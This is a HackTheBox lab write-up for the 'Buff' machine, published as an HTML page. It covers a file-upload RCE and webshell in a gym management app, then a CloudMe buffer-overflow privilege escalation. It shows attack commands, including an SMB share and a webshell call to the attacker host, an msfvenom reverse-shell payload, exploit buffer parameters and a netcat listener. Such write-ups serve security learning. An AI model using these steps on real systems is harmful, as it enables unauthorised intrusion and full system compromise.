@@ -1,0 +1,227 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Buff</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>Buff (HTB – Easy)</h1>
+
+<p>
+This machine exposes a vulnerable gym management web application on port 8080 that allows remote code execution
+via a file upload exploit. Initial access is obtained as a Windows user, and privilege escalation is performed
+by exploiting a buffer overflow in a locally running CloudMe service on port 8888.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: 10.10.11.X  
+<br>Main vector: Gym Management System RCE (file upload)  
+<br>Privilege escalation: CloudMe 1.11.2 buffer overflow (port 8888)  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Web service on port 8080:</p>
+<pre>
+http://IP:8080
+-> Gym Management System
+</pre>
+
+<p>Searchsploit:</p>
+<pre>
+$ searchsploit "gym management"
+-> Exploit with RCE via file upload (ID 48506)
+</pre>
+
+<p>
+The exploit is a Python2 script that uploads a PHP file with a double extension and triggers it with a
+<code>telepathy</code> parameter.
+</p>
+
+<h2>Initial Exploitation</h2>
+
+<p>Run the exploit against the target:</p>
+<pre>
+$ python2 gym_exploit_rce.py http://IP:8080
+</pre>
+
+<p>
+The exploit uploads a webshell under <code>/upload/</code>.  
+To execute commands, the <code>telepathy</code> parameter is used.
+</p>
+
+<p>Serve tools via SMB from the attacker:</p>
+<pre>
+$ impacket-smbserver smbFolder $(pwd) -smb2support
+</pre>
+
+<p>Test command execution:</p>
+<pre>
+http://IP:8080/upload/kamehameha.php?telepathy=dir \\KALI_IP\smbFolder
+</pre>
+
+<p>
+Once command execution is confirmed, a reverse shell can be obtained by hosting <code>nc.exe</code> and calling it
+through the webshell (URL-encoding may be required).
+</p>
+
+<p>
+After the reverse shell is established, <code>user.txt</code> is accessible.
+</p>
+
+<h2>Privilege Escalation</h2>
+
+<p>Enumeration with winPEAS:</p>
+<pre>
+C:\> winPEASx64.exe
+</pre>
+
+<p>
+winPEAS reveals a CloudMe service. Default CloudMe port is 8888.
+</p>
+
+<p>Confirm locally:</p>
+<pre>
+C:\> netstat -nat
+-> 127.0.0.1:8888 listening
+</pre>
+
+<p>Searchsploit:</p>
+<pre>
+$ searchsploit cloudme 1.11.2
+-> Exploit ID 48389 (buffer overflow)
+</pre>
+
+<h3>Exploit Preparation</h3>
+
+<p>
+A custom Python exploit is used to trigger the overflow and execute a reverse shell payload.
+The payload is generated with <code>msfvenom</code>:
+</p>
+
+<pre>
+$ msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
+</pre>
+
+<p>
+The shellcode is embedded into <code>bof_exploit.py</code>, which connects to port 8888 and sends the crafted buffer:
+</p>
+
+<pre>
+target   = "127.0.0.1"
+padding1 = b"\x90" * 1052
+EIP      = b"\xB5\x42\xA8\x68"  # 0x68A842B5 -> PUSH ESP; RET
+NOPS     = b"\x90" * 30
+buf      = (msfvenom shellcode)
+</pre>
+
+<p>
+The script sends the payload to the CloudMe service:
+</p>
+
+<pre>
+$ python bof_exploit.py
+</pre>
+
+<p>
+On the attacker side, a listener is waiting:
+</p>
+
+<pre>
+$ nc -nlvp 4444
+</pre>
+
+<p>
+When the exploit succeeds, a reverse shell is obtained as a higher-privileged user (SYSTEM or equivalent),
+allowing access to <code>root.txt</code>.
+</p>
+
+<h2>Conclusion</h2>
+<p>
+The machine combines a web application RCE (file upload in Gym Management System) with a local buffer overflow
+in CloudMe. After gaining a foothold through the webshell, the CloudMe service on port 8888 is exploited using
+a custom Python buffer overflow script with msfvenom shellcode to obtain full system compromise.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
